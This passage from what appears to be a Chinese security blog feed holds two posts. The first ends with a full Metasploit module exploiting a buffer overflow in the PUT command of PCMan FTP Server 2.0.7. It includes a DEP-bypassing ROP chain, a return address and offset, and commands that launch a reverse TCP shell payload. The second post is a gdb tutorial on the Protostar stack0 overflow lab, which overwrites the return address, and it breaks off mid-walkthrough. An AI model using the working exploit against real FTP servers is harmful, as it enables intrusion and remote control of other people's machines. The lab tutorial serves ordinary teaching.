&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/ebx_error.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;后来发现原来的mona中的virtualprotect是获得0x201(对应上面的0xffffddff,neg取反后为0x201)个可执行栈空间,以为是msf中的payload比这个长导致shellcode执行出错,后来将这个值设置为0xffffddff后没能关掉dep,应该是由于长度太大或许超过了栈空间的大小而导致virtualprotect函数的失败,于是没能成功关掉dep

后来将这个值设置成0xfffffaff(neg取反后的结果比0x201大),又可以关掉dep了,只是后面的shellcode执行还是不成功

怀疑有可能是像上图ebx_error中说的是ebx错了,也有可能是像0day2中说的ebp在溢出的过程中被破坏,这些只有再次从od中动态分析才可知

后来还是自己想多了,mona之所以称为神器,在于的确是神器,怎会轻易出错

换个payload马上成功,对msf还是不够熟悉！！一个payload不行可以换啊！！

最后的exploit.rb如下,改成mypcmanftp-anti-dep.rb,放到/msfdirectory/modules/exploit/windows/my/目录下后执行下面的命令:
use exploit/windows/my/mypcmanftp-anti-dep
set payload windows/shell/reverse_tcp_rc4
set RC4PASSWORD mypassword
exploit
成功弹shell
----------------------------exploit.rb-------------------------------
    # This module requires Metasploit: http://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    
    require &#39;msf/core&#39;
    
    class Metasploit3 &amp;lt; Msf::Exploit::Remote
      Rank = NormalRanking
    
      include Msf::Exploit::Remote::Ftp
    
      def initialize(info = {})
        super(update_info(info,
          &#39;Name&#39;           =&amp;gt; &#39;PCMAN FTP Server Buffer Overflow - PUT Command&#39;,
          &#39;Description&#39;    =&amp;gt; %q{
              This module exploits a buffer overflow vulnerability found in the PUT command of the
              PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
              credientials are enabled.
          },
          &#39;Author&#39;         =&amp;gt;
              [
                &#39;quanyechavshuo&#39;
              ],
          &#39;License&#39;        =&amp;gt; MSF_LICENSE,
          &#39;References&#39;     =&amp;gt;
            [
              [ &#39;EDB&#39;,   &#39;37731&#39;],
              [ &#39;OSVDB&#39;,   &#39;94624&#39;]
            ],
          &#39;DefaultOptions&#39; =&amp;gt;
            {
              &#39;EXITFUNC&#39; =&amp;gt; &#39;process&#39;
            },
          &#39;Payload&#39;        =&amp;gt;
            {
              &#39;Space&#39;   =&amp;gt; 1000,
              &#39;BadChars&#39;  =&amp;gt; &quot;\x00\x0A\x0D&quot;,
            },
          &#39;Platform&#39;       =&amp;gt; &#39;win&#39;,
          &#39;Targets&#39;        =&amp;gt;
            [
              [ &#39;windows 7 x64&#39;,
                {
                  &#39;Ret&#39; =&amp;gt; 0x77636aeb, # jmp esp C:\WINDOWS\system32\ntdll.dll
                  &#39;Offset&#39; =&amp;gt; 2008
                }
              ],
            ],
          &#39;DisclosureDate&#39; =&amp;gt; &#39;Aug 07 2015&#39;,
          &#39;DefaultTarget&#39;  =&amp;gt; 0))
      end
    
      def check
        connect_login
        disconnect
    
        if /220 PCMan&#39;s FTP Server 2\.0/ === banner
          Exploit::CheckCode::Appears
        else
          Exploit::CheckCode::Safe
        end
      end

  def create_rop_chain()
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x77032c3b,  # POP EAX # RETN [kernel32.dll] 
      0x41414141,
      0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
      0x76bb4412,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSCTF.dll] 
      0x76408d2a,  # XCHG EAX,ESI # RETN [SHLWAPI.dll] 
      0x76b607f0,  # POP EBP # RETN [msvcrt.dll] 
      0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
      0x7368b031,  # POP EAX # RETN [COMCTL32.dll] 
      0xfffffaff,  # Value to negate, will become 0x00000201
      0x756c9a5c,  # NEG EAX # RETN [SHELL32.dll] 
      0x767088bd,  # XCHG EAX,EBX # RETN [RPCRT4.dll] 
      0x77031d7b,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76cc4402,  # NEG EAX # RETN [SHELL32.dll] 
      0x76b4ad98,  # XCHG EAX,EDX # RETN [SHELL32.dll] 
      0x756b1cc1,  # POP ECX # RETN [SHELL32.dll] 
      0x7647c663,  # &amp;amp;Writable location [USP10.dll]
      0x73756cf3,  # POP EDI # RETN [COMCTL32.dll] 
      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
      0x76b3f5d4,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop 
      0x7366e16f,  # PUSHAD # RETN [COMCTL32.dll] 

    ].flatten.pack(&quot;V*&quot;)

    return rop_gadgets

  end


      def exploit
        connect_login
    
        print_status(&#39;Generating payload...&#39;)
        sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
        sploit &amp;lt;&amp;lt; create_rop_chain()
        #sploit &amp;lt;&amp;lt; make_nops(9) 这句产生的nop并非90
        sploit &amp;lt;&amp;lt; &quot;\x90&quot;*30
        #sploit &amp;lt;&amp;lt; &quot;\x41&quot;*30
        #sploit &amp;lt;&amp;lt; &quot;\xcc&quot;
        sploit &amp;lt;&amp;lt; payload.encoded
    
        #tmp=sploit
        tmp=make_nops(9)
        print_status(tmp)
    
        send_cmd( [&quot;ls&quot;, sploit], false )
        disconnect
      end
    
    end

-------------------------------end-----------------------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/succeed.png&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 13 Jun 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/13/pcman-ftp%E5%88%9D%E6%88%98%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/13/pcman-ftp%E5%88%9D%E6%88%98%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</guid>
        
        <category>ftp</category>
        
        <category>挖洞</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>二进制入门--动态跟踪源代码与反汇编代码</title>
        <description>&lt;h3 id=&quot;x01-&quot;&gt;0x01 栈基础知识&lt;/h3&gt;

&lt;h4 id=&quot;httpblogchinaunixnetuid-1848701-id-2825699html&quot;&gt;1&amp;gt;http://blog.chinaunix.net/uid-1848701-id-2825699.html&lt;/h4&gt;

&lt;h4 id=&quot;eip&quot;&gt;2&amp;gt;eip是当前帧中还没开始执行,下一步要执行的汇编指令的地址&lt;/h4&gt;

&lt;h4 id=&quot;section&quot;&gt;3&amp;gt;32位系统中,一个栈单元为32位&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esp+0x4代表下一个栈单元
esp+0x1c代表esp下面第[16+12=28(/4=7)] 7个栈单元
eg.
    esp[ss:0x00000000]         |ab221245|   --&amp;gt;  一个栈单元
    esp+0x4[ss:0x00000004]     |2348sko9|   --&amp;gt;  一个栈单元
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;call-addrpush-eip--jmp-addr&quot;&gt;4&amp;gt;call addr===&amp;gt;push eip + jmp addr&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;执行call addr时,由于call addr已经执行,所以call addr=push eip+jmp addr中的eip为call addr汇编指令当前所在帧中的下一条指令的地址,这里说的当前所在帧是如下图frame所示在当前图片看到的一片汇编指令代码,如执行0xff77b8d02处的call 0xf77bc2e0时,eip为当前帧的下一条指令的地址为f77b8d07
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图frame
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/eip.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;leavemov-espebp--pop-ebp&quot;&gt;5&amp;gt;leave===&amp;gt;mov esp,ebp + pop ebp&lt;/h4&gt;

&lt;h4 id=&quot;retnpop-eip--jmp-eip----eipespespesp4&quot;&gt;6&amp;gt;retn===&amp;gt;pop eip + jmp eip    (eip=[esp],esp=esp+4)&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;分析ret汇编语句时,最好不要把ret分开当作两句汇编指令,这样容易因为人脑习惯逐句解析两句,会和计算机的解析一句汇编指令错乱
特别是影响esp,eip的寄存器的分析时,要按照计算机的解析模式--&amp;gt;ret只是一句指令,执行完ret指令后,eip=[esp],esp=esp+4
分析ret指令时,先分析eip,再分析esp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;retn-0xnretn--espesp0xneipesp--espesp40xn&quot;&gt;7&amp;gt;retn 0xn===&amp;gt;retn &amp;amp;&amp;amp; esp=esp+0xn===&amp;gt;eip=[esp] &amp;amp;&amp;amp; esp=esp+4+0xn&lt;/h4&gt;

&lt;h4 id=&quot;call-esp&quot;&gt;8&amp;gt;call esp:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jmp esp
call esp
push esp+ret
这些汇编指令的地址放入存放函数返回地址的位置处都可以达到跳转到它后面的shellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;由于call addr等同于push eip+jmp addr,执行call esp时,esp是个地址,系统将这里的esp翻译成一个普通地址,假设值为addr,call esp即相当于上面的call addr=push eip+jmp addr
      代码段:                                    栈段:          
                      ..                                                
                      ..                                  | addr1 |
        addr0     call esp(esp=addr)   ------&amp;gt;       addr |       |
        addr1     opcode_1                                |       |

当eip=addr0时,esp=addr
当eip=addr1时,正在执行addr0处的call esp,也即call addr=push eip+jmp addr=push addr1+jmp addr
执行完call esp后栈段如上图右部所示
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;pop-pop-retjmp-esp16pop-pop-ret&quot;&gt;9&amp;gt;pop pop ret=jmp &lt;a href=&quot;条件:pop pop ret的地址在栈中且马上要执行&quot;&gt;esp+16&lt;/a&gt;&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;栈段:                          代码段:

    addr0     | addr1 |                 addr1:  pop1
    addr0+4   |       |                         pop2
    addr0+8   |       |                         ret
    addr0+12  |       |
    addr0+16  |       |

满足条件时,栈中addr1覆盖的是一个函数的返回地址,esp=eip=addr0,还没但正要去执行ret=pop eip+jmp eip,
执行完这个ret的前一句后,eip=ret的地址,esp=addr0,然后跳转到ret的地址处执行ret
执行完这个ret后,eip=addr1,esp=addr0+4,然后执行addr1处的pop1
执行完pop1后,eip=addr1+4,esp=addr0+8,然后执行addr1+4处的pop2
执行完pop2后,eip=addr1+8,esp=addr0+12,然后执行addr1+8处的ret
执行完ret后,eip=[addr0+16],esp=addr0+16,然后执行[add0+16]处的代码
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-gdb&quot;&gt;0x02 gdb动态调试&lt;/h3&gt;

&lt;h4 id=&quot;gdb&quot;&gt;1&amp;gt;gdb常用调试命令&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://wenku.baidu.com/link?url=W1u-DTrFwMreJsYavwKcI_yDzJsJglUJ4yfcXXXxWOkGTlJSSqXm-4zohcUYxGciOIeFRcSY0gr2qn-K5pnqGRU6nGbgQvW6XVfaRMCdmKq
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;section-1&quot;&gt;2&amp;gt;提炼命令:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   --------terminal-----------
   gdb
   help
   help data
   help stack
   help status
   -----------end-------------
   gdb stack0           #===&amp;gt;gdb + file stack0
   l(list)              #show source
   b 7(break 7)         #add break on line7
   b 8(break 8)         #add break on line8
   b 11
   b 13
   b 15
   info b(info break)
   info registers       #show registers
   r(run)               #第一次运行或重新开始运行程序
   start                #开始运行程序
   continue             #继续运行
   disas /m
                /r      #show hex(显示汇编指令对应十六进制值)
                /m      #show source if available(如果有源码,显示对应行源码)
   set disassembly-flavor att/intel     #设置att或intel格式
   set disassemble-next-line            #设置下一步是否显示汇编码
   si(setpi)                            #==&amp;gt; step into,like f7 in od
   ni(nexti)                            #==&amp;gt; like f8 in od
   leave                #立即中断当前函数运行并返回,当前函数的剩余语句将不被执行
   finish               #执行到当前函数返回之后停止,当前函数的剩余语句将正常运行
   bt(backtrace)        #查看所有栈帧信息
   f num(frame num)     #选择并打印第num个栈帧信息
   info f(info frame)   #查看当前栈帧信息

   layout：用于分割窗口，可以一边查看代码，一边测试：
   layout src：显示源代码窗口
   layout asm：显示反汇编窗口
   layout regs：显示源代码/反汇编和CPU寄存器窗口
   layout split：显示源代码和反汇编窗口
   Ctrl + L：刷新窗口
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-&quot;&gt;0x03 实例分析&lt;/h3&gt;

&lt;h4 id=&quot;linkhttpsexploit-exercisescomprotostarstack0&quot;&gt;link:https://exploit-exercises.com/protostar/stack0/&lt;/h4&gt;

&lt;p&gt;源码如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--------stack0.c----------
1       #include &amp;lt;stdlib.h&amp;gt;
2       #include &amp;lt;unistd.h&amp;gt;
3       #include &amp;lt;stdio.h&amp;gt;
4
5       int main(int argc, char **argv)
6       {
7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;
11        gets(buffer);
12
13        if(modified != 0) {
14            printf(&quot;you have changed the &#39;modified&#39; variable\n&quot;);
15        } else {
16            printf(&quot;Try again?\n&quot;);
17        }
18      }
-----------end------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;该题要求溢出变量modified,也即覆盖栈中的modified所在的内在地址里的值,在终端中执行如下命令,下面为实时操作与对输出的相应理解&lt;/p&gt;

&lt;p&gt;on kali:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /root/桌面
vi stack0.c with upon source code
gcc -g -o stack0 stack0.c
gdb stack0

l
----------output:----------
1       #include &amp;lt;stdlib.h&amp;gt;
2       #include &amp;lt;unistd.h&amp;gt;
3       #include &amp;lt;stdio.h&amp;gt;
4
5       int main(int argc, char **argv)
6       {
7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;
-----------end----------

l
----------output:----------
11        gets(buffer);                                                                                                                      
12                                                                                                                                           
13        if(modified != 0) {                                                                                                                
14            printf(&quot;you have changed the &#39;modified&#39; variable\n&quot;);                                                                          
15        } else {                                                                                                                           
16            printf(&quot;Try again?\n&quot;);                                                                                                        
17        }                                                                                                                                  
18      } 
-----------end----------

b 7
b 8
b 11
b 13
b 15

info b
---------output:-----------
Num     Type           Disp Enb Address    What                                                                                              
1       breakpoint     keep y   0x080483fd in main at stack0.c:7                                                                             
breakpoint already hit 1 time                                                                                                        
2       breakpoint     keep y   0x080483fd in main at stack0.c:8                                                                             
breakpoint already hit 1 time                                                                                                        
3       breakpoint     keep y   0x08048405 in main at stack0.c:11                                                                            
breakpoint already hit 1 time                                                                                                        
4       breakpoint     keep y   0x08048411 in main at stack0.c:13                                                                            
5       breakpoint     keep y   0x08048427 in main at stack0.c:15     
----------end--------------

r

disas /m
-------------output:---------------
7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;
=&amp;gt; 0x080483fd &amp;lt;+9&amp;gt;:     movl   $0x0,0x5c(%esp)
---------------end-----------------

通过上面的结果发现中断在line10,而其中line7,lin8中的两个定义变量的语句volatile int modified和char buffer[64]并没有中断效果 

main函数对应汇编代码从line6开始:
---------------------------------汇编跟踪:line6------------------------------------------
Dump of assembler code for function main:
6       {
0x080483f4 &amp;lt;+0&amp;gt;:     push   %ebp                 #ebp压栈,对应下图stack0中的序号1
0x080483f5 &amp;lt;+1&amp;gt;:     mov    %esp,%ebp            #ebp=esp,对应下图stack0中的序号2
0x080483f7 &amp;lt;+3&amp;gt;:     and    $0xfffffff0,%esp     #将esp最后四位置0,应该是一种安全措施,获得更大的栈空间,对应序号3
0x080483fa &amp;lt;+6&amp;gt;:     sub    $0x60,%esp           #扩大栈空间,0x60=96=(/4=24)24个栈单元,对应序号4
---------------------------------------end-----------------------------------------------

line7,lin8代码:
------------line7,8---------------
7         volatile int modified;
8         char buffer[64];
--------------end-----------------

这两行代码由于无法在gdb中跟踪,暂时无法确定在栈中的分布情况

--------------secret-----------------
下文将会得出(此时可以先不看这个secret):
1.进入main函数前的上一帧中,有一个调用main函数的动作,为了调用main函数,有这几个动作:
1&amp;gt;将main函数的参数从右到左压栈(push)
2&amp;gt;call main,将当前帧(还没进入main函数时的帧)中call main汇编语句的下一行汇编语句的地址压栈
2.在进入main函数,main初始化后(push ebp,ebp=esp,esp=esp-0x60),声明变量的line7:volatile int modified,char buffer[64]的对应汇编效果是:
从上一句esp=esp-0x60中的esp为扩展0x60的栈空间大小之前的esp开始依次&quot;压入&quot;接下来声明的各个变量,也即:
1&amp;gt;在下图stack0中的0xffffd4ec中&quot;压入&quot; modified变量,在0xffffd4ec上面&quot;压入&quot;buffer[64]这个大变量,也即在0xffffd4ec-0x40&amp;lt;==&amp;gt;0xffffd4ec上面64B空间(16个栈单元)的位置上
2&amp;gt;这里打了引号的&quot;压入&quot;没有esp=esp-4的效果,应该是操作系统对程序初始化时算好了将要声明的变量放到(&quot;压入&quot;)对应的位置上
3.一般栈中从下到上数据依次为函数从右到左的参数、调用该函数的上一帧中&quot;call 该函数&quot;形式的对应汇编指令的下一句汇编指令的地址、该函数的上一帧函数的ebp
4.只要修改了0xffffd4ec处(存放了modified变量)的值,将其改成非0就可以完成这一题的要求了
5.上面3中说的非0是内存中的非0,如果是键盘上的0键并不是内存中的0,如下图ascii所示
--------------end--------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图ascii
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/ascii.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;line10:(line9是空格行)
-----------------汇编跟踪:line10----------------------
10        modified = 0;
=&amp;gt; 0x080483fd &amp;lt;+9&amp;gt;:     movl   $0x0,0x5c(%esp)      #0x5c=92(/4=23)=23个栈单元,将esp下面第23个栈单元置0,对应图中序号5,在下一步可可发现是将0xffffd4ec处的32位空间置0
----------------------end-----------------------------

x $esp+0x5c
----------output:------------
0xffffd4ec:     0xf7fa6000
------------end--------------

再执行stepi后会执行[esp+0x5c]=0,将上面的地址对应内容置0

line11:
-----------------汇编跟踪:line11-----------------------
11        gets(buffer);
0x08048405 &amp;lt;+17&amp;gt;:    lea    0x1c(%esp),%eax          #eax=esp+0x1c,0x1c=28(/4=7)=7个栈单元,对应图中序号6
0x08048409 &amp;lt;+21&amp;gt;:    mov    %eax,(%esp)              #[esp]=eax,对应图中序号7,为了下面的call gets作准备--&amp;gt;将func gets的参数&quot;入栈&quot;(放到对应的位置,不是push arg,没有esp=esp-4)
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;     #上面一行[esp]=eax=addr,将buffer[64]的起始地址放入栈中准备给gets函数调用
-----------------------end-----------------------------

stepi(0xffffd4ec被置0)
x $esp+0x5c
-----------output:-----------
0xffffd4ec:     0x00000000
-------------end-------------

disas /m
------------out:-----------
11        gets(buffer);                                                                                                                      
=&amp;gt; 0x08048405 &amp;lt;+17&amp;gt;:    lea    0x1c(%esp),%eax     #这行左边的箭头表示运行到这行,也即eip=0x08048405,此时x $esp+0x5c ===&amp;gt; 0xffffd4ec:  0x00000000
    
0x08048409 &amp;lt;+21&amp;gt;:    mov    %eax,(%esp)         #此外,lea 0x1c(%esp),%eax(in att mode)&amp;lt;==&amp;gt;lea eax,[esp+0x1c](in intel mode)                                                                                                                                                            
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;                                                                                          
-------------end-----------

set disassembly-flavor intel(upon output is the result of &quot;set dissassembly-flavor att&quot; on default)
---------------output:---------------
11        gets(buffer);                                                                                                                      
=&amp;gt; 0x08048405 &amp;lt;+17&amp;gt;:    lea    eax,[esp+0x1c]                                                                                                
0x08048409 &amp;lt;+21&amp;gt;:    mov    DWORD PTR [esp],eax                                                                                           
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;                                                                                          
------------------end----------------

pay attention to eip part:(symbol &quot;=&amp;gt;&quot; means eip is here)
---------eip part----------
11        gets(buffer);                                                                    
=&amp;gt; 0x08048405 &amp;lt;+17&amp;gt;:    lea    eax,[esp+0x1c]           #将esp+0x1c的值赋给eax,eax=0xffffd4ac
0x08048409 &amp;lt;+21&amp;gt;:    mov    DWORD PTR [esp],eax      
0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;     #push 0x08048411,jmp func gets,对应图中序号8
------------end------------

p $esp+0x1c          #print $esp+0x1c,打印$esp+0x1c变量的值
output:$2 = (void *) 0xffffd4ac

x $esp+0x1c          #x addr==&amp;gt;print [addr],that is to say,print the value in the address of addr
---------output:(==&amp;gt;x $eax)----
0xffffd4ac:     0xf7e2e243
-----------end-----------------

si
si
disas /m
---------output:------------
11        gets(buffer);
0x08048405 &amp;lt;+17&amp;gt;:    lea    eax,[esp+0x1c]
0x08048409 &amp;lt;+21&amp;gt;:    mov    DWORD PTR [esp],eax
=&amp;gt; 0x0804840c &amp;lt;+24&amp;gt;:    call   0x804830c &amp;lt;gets@plt&amp;gt;
----------end---------------

x $eax
-------output:------------
0xffffd4ac:     0xf7e2e243
------------end-----------
    
x/4 $esp    #查看当前栈中esp起4个栈单元的情况
---------output:------------
0xffffd490:     0xffffd4ac      0x00000000      0x000000c2      0xf7e92ee6
-------------end------------

其中的0xffffd4ac对应图中的序号6中数值
    
n
输入:
12345678981234567898123456789812345678981234567898123456789812340000
enter
其中最后的12340000为第60到68个字符
-----------output:--------------
Breakpoint 4, main (argc=1, argv=0xffffd594) at stack0.c:13
13        if(modified != 0) {
--------------end---------------
    
si
disas /m
---------output:------------
13        if(modified != 0) {
0x08048411 &amp;lt;+29&amp;gt;:    mov    eax,DWORD PTR [esp+0x5c]
=&amp;gt; 0x08048415 &amp;lt;+33&amp;gt;:    test   eax,eax
-------------end------------

p $eax
-----------output:------------
$4 = 808464432
------------end---------------

p/x $eax(以十六进制显示eax的值,help x(x $esp+0x1c相当于p [$esp+0x1c]的效果,只不过p不支持p [somethin]命令显示内存地址对应的内容)中的/FMT可以看到支持的各种显示格式)
------------output:-------------
$5 = 0x30303030
---------------end--------------

这里的0x30303030是上面输入的68个键盘上的数字中的最后4个0对应的内存中的值,键盘上的数字0对应的真实内存ascii值为48(十进制),也即十六进制0x30,更多关于ascii的理解可参考https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9217
所以要输入第65到68个字符单元为内存中的0,也即ascii值为nul的字符:
print &#39;\x00&#39;(或python -c &#39;print &quot;\x00&quot;&#39;)
output:空
print &#39;0&#39;(或python -c &#39;python &quot;0&quot;&#39;)
output:0
print &#39;\x30&#39;(或python -c &#39;python &quot;\x30&quot;&#39;)
output:0
所以print &#39;\x00&#39;在内存中的数据为0,print &#39;0&#39;&amp;lt;==&amp;gt;print &#39;\x30&#39;
重新运行./stack0并输入下面的值可使modified在内存中的值不变,依然为内存中的0
1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00
注意,如果直接在键盘上输入上面这一长串,最后的\x00\x00\x00\x00在内存中并不能被解析成内存中的0000,要使用如下方法:

print &#39;1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00&#39; | ./stack0
或
echo &#39;1234567898123456789812345678981234567898123456789812345678981234\x00\x00\x00\x00&#39; | ./stack0

原题中要求改变modified位,直接输入键盘上的任意大于64位的一串字符即可,因为键盘上的数字0在内存中是0x30,如果将键盘上的0键输入到对应的modified位上,会改变modified
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图stack0
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/stack0.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;该题要求溢出变量modified,也即覆盖栈中的modified所在的内在地址里的值,这里进行扩展,通过栈溢出反弹shell.
该题中ASLR(地址随机化) 和 NX(栈不可执行)已禁用
由上图stack0及分析易知:
1.栈中如果将一个函数展开,一般从push ebp+mov ebp,esp+sub esp,0x??开始到leave+ret结束,将这些看作是该函数的帧,该函数的上一帧中有调用该函数的汇编语句,该函数的返回地址在栈中的位置为该函数帧的下面一个栈单元内(保存在该函数帧的下面一个栈单元内)
2.栈中内容由下至上依次为:函数的返回地址、函数的帧(由下至上从函数的上一帧中ebp的值开始)
3.gets函数通过终端输入超长字符只能覆盖main函数帧的上一帧中调用main函数时main函数的返回地址main_ret,不能覆盖main函数帧中调用gets函数时get函数的返回地址gets_ret

计算需要输入多少字符可以覆盖main_ret:

r
Start it from the beginning? (y or n)
y
info b
-------------output:-------------
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x080483fd in main at stack0.c:7
        breakpoint already hit 1 time
2       breakpoint     keep y   0x080483fd in main at stack0.c:8
        breakpoint already hit 1 time
3       breakpoint     keep y   0x08048405 in main at stack0.c:11
4       breakpoint     keep y   0x08048411 in main at stack0.c:13
5       breakpoint     keep y   0x08048427 in main at stack0.c:15
---------------end---------------

disas /m
----------------output:--------------------
Dump of assembler code for function main:
6       {
   0x080483f4 &amp;lt;+0&amp;gt;:     push   ebp
   0x080483f5 &amp;lt;+1&amp;gt;:     mov    ebp,esp
   0x080483f7 &amp;lt;+3&amp;gt;:     and    esp,0xfffffff0
   0x080483fa &amp;lt;+6&amp;gt;:     sub    esp,0x60

7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;
=&amp;gt; 0x080483fd &amp;lt;+9&amp;gt;:     mov    DWORD PTR [esp+0x5c],0x0
-----------------end-----------------------

b *0x080483f5
r
Start it from the beginning? (y or n) 
y
-------------------output:-------------------
Starting program: /root/桌面/stack0 

Breakpoint 6, 0x080483f5 in main (argc=1, argv=0xffffd594) at stack0.c:6
6       {
---------------------end---------------------

disas /m
-----------------output:-------------------
Dump of assembler code for function main:
6       {
   0x080483f4 &amp;lt;+0&amp;gt;:     push   ebp
=&amp;gt; 0x080483f5 &amp;lt;+1&amp;gt;:     mov    ebp,esp
   0x080483f7 &amp;lt;+3&amp;gt;:     and    esp,0xfffffff0
-------------------end---------------------

p $esp
-------------output:-----------------
$7 = (void *) 0xffffd4f8
---------------end-------------------

也即执行完0x080483f4后esp值为0xffffd4f8,所以要覆盖main_ret,需要输入(0xffffd4f8-0xffffd4ec)/4+16+1+1=21个栈单元=21*4=84B,也即84个字符
main_ret=0xffffd4f8+0x4=0xffffd4fc

python -c &quot;print &#39;a&#39;*80+&#39;bbbb&#39;&quot; | ./stack0     #(此时不可直接print &#39;a&#39;*80,print不支持)
------------output:------------
you have changed the &#39;modified&#39; variable
[1]    11055 done                python -c &#39;print &quot;a&quot;*80+&quot;bbbb&quot;&#39; | 
       11056 segmentation fault  ./stack0
-------------end---------------

gdb -q -c core
--------output:----------
/root/桌面/core: 没有那个文件或目录.
----------end------------

解决方法:(http://blog.csdn.net/nuoline/article/details/8610694)
ulimit -c
---------output:----------
0
------------end-----------

ulimit -c 2048
python -c &#39;print &quot;a&quot;*80+&quot;bbbb&quot;&#39; | ./stack0
------------output:--------------
you have changed the &#39;modified&#39; variable
[1]    11403 done                              python -c &#39;print &quot;a&quot;*80+&quot;bbbb&quot;&#39; | 
       11404 segmentation fault (core dumped)  ./stack0
--------------end----------------

gdb -q -c core
----------------output:---------------
[New LWP 11404]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x62626262 in ?? ()
-----------------end------------------

从而发现某个函数(main函数)的返回地址被改写成0x62626262(bbbb),从而产生溢出错误

或者:

gdb ./stack0
b 18
si
si
此时程序将执行到达main函数帧中的ret,再si将跳转到main_ret处,可通过以下验证
-------------output:--------------
15        } else {
16            printf(&quot;Try again?\n&quot;);
   0x08048427 &amp;lt;+51&amp;gt;:    movl   $0x8048529,(%esp)
   0x0804842e &amp;lt;+58&amp;gt;:    call   0x804832c &amp;lt;puts@plt&amp;gt;

17        }
18      }
   0x08048433 &amp;lt;+63&amp;gt;:    leave  
---Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---
=&amp;gt; 0x08048434 &amp;lt;+64&amp;gt;:    ret    

End of assembler dump.
(gdb) si
0x62626262 in ?? ()
--------------end-----------------

同样可以发现main_ret被溢出为0x62626262(bbbb)

检验一下:
